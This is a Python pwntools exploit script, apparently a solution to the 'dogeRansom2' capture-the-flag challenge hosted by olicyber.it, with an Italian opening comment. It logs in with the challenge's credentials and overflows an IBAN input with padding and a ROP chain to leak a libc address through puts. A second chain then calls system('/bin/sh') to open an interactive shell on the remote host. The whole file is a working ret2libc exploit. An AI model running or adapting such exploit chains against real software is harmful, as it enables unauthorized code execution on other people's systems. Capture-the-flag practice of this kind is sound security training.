# NON SO SE FOSSE LA INTENDED, PERÒ BO, ORMAI LE FACCIO TUTTE COSÌ

from pwn import *

exe = ELF("./dogeRansom2_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "dogeransom2.challs.olicyber.it"
PORT = 10806

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def login(r):
    r.sendlineafter(b"Username: ", b"Dr. Bez Casamiei")
    r.sendlineafter(b"Password: ", b"Team-fortezza-10")

IBAN = b"IT70S0501811800000012284030\x00"

def leak_libc(r):
    rop = ROP(exe)
    rop.call("puts", [exe.got.puts])
    rop.raw(rop.ret.address)
    rop.call("main", [])
    
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"inviare: ", b"1")
    r.sendlineafter(b"dogemoney: ", IBAN)
    r.sendlineafter(b"iban: ", IBAN + b"\x00" * (0x40 - len(IBAN)) + rop.chain())

    libc.address = int.from_bytes(r.recvline()[::-1][1:]) - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def call_system(r):
    rop = ROP(libc)
    rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
    
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"inviare: ", b"1")
    r.sendlineafter(b"dogemoney: ", IBAN)
    r.sendlineafter(b"iban: ", IBAN + b"\x00" * (0x40 - len(IBAN)) + rop.chain())

def main():
    r = conn()
    
    login(r)
    leak_libc(r)

    login(r)
    call_system(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
